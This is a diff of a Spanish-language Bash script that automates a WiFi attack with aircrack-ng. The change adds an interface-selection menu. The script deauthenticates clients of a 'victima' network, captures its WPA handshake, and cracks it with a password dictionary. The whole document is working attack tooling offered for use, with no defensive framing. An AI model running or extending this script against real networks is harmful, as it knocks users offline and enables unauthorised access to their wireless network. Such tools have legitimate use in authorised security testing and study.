@@ -5,8 +5,46 @@ echo "Escrito por: mmaganadebia."
 echo ""
 read -p "Hola $USER, ¿Quieres comenzar? (si / no): " firstDecision
 
+ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep -E "^lo$" -v)
+
+invalid_iface_selected(){
+  select_interface
+}
+
+select_interface(){
+option_counter=0
+	for item in ${ifaces}; do
+		option_counter=$((option_counter + 1))
+		if [ ${#option_counter} -eq 1 ]; then
+			spaceiface="  "
+		else
+			spaceiface="  "
+		fi
+		echo -ne "${option_counter}.${spaceiface}${item}  "
+	
+	if [ "" = "" ]; then
+        echo ""	
+	fi
+	done
+
+	read -rp "> " iface
+	if [[ ! ${iface} =~ ^[[:digit:]]+$ ]] || (( iface < 1 || iface > option_counter )); then
+		invalid_iface_selected
+	else
+		option_counter2=0
+		for item2 in ${ifaces}; do
+			option_counter2=$((option_counter2 + 1))
+			if [[ "${iface}" = "${option_counter2}" ]]; then
+				interface=${item2}
+				break
+			fi
+		done
+    fi
+  }
+
+
 firstTerminal(){
-  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $red wlp2s0mon &
+  xterm -hold -e sudo airodump-ng -c $canal --bssid $mac --write $red "$interface"'mon' &
 }
 
 aircrackInstall(){
@@ -40,7 +78,7 @@ deauthentication(){
   read -p "¿Quieres enviar otro ataque de desautenticación? (si / no) " deauth
   case $deauth in
     si)
-      sudo aireplay-ng -0 10 -a $mac  -e $red wlp2s0mon
+      sudo aireplay-ng -0 10 -a $mac  -e $red "$interface"'mon'
       deauthentication
       ;;
     no)
@@ -53,16 +91,16 @@ dictionariOrSave(){
   case $doc in
     D)
       read -p "Escribe la ruta del diccionario: " diccionario
-      xterm -hold -e sudo aircrack-ng "$name"'-01.cap' -w "$diccionario" &
+      xterm -hold -e sudo aircrack-ng "$red"'-01.cap' -w "$diccionario" &
       sudo service NetworkManager start
-      sudo airmon-ng stop wlp2s0mon
+      sudo airmon-ng stop "$interface"'mon'
       exit
      ;;
     G)
       echo "Saliendo..."
       sleep 2s
       sudo service NetworkManager start
-      sudo airmon-ng stop wlp2s0mon
+      sudo airmon-ng stop "$interface"'mon'
       exit
   esac
 }
@@ -74,18 +112,19 @@ case $firstDecision in
     echo "Comenzando..."
     echo "Matando procesos que pueden interferir..."
     sudo airmon-ng check kill
+    select_interface
     echo "Poniendo interfaz en modo monitor..."
-    sudo airmon-ng start wlp2s0
+    sudo airmon-ng start $interface
     echo "Escaneando redes..."
     echo "Puedes detener el escaneo cuando quieras con ctrl +c"
     sleep 5s
-    sudo airodump-ng wlp2s0mon 
+    sudo airodump-ng "$interface"'mon'
     read -p "Canal de la victima: " canal
     read -p "Nombre de la red: " red
     read -p "Direccion MAC: " mac
     firstTerminal 
     sleep 5s 
-    sudo aireplay-ng -0 10 -a $mac  -e $red wlp2s0mon
+    sudo aireplay-ng -0 10 -a $mac  -e $red "$interface"'mon'
     deauthentication
     ;;
   no)
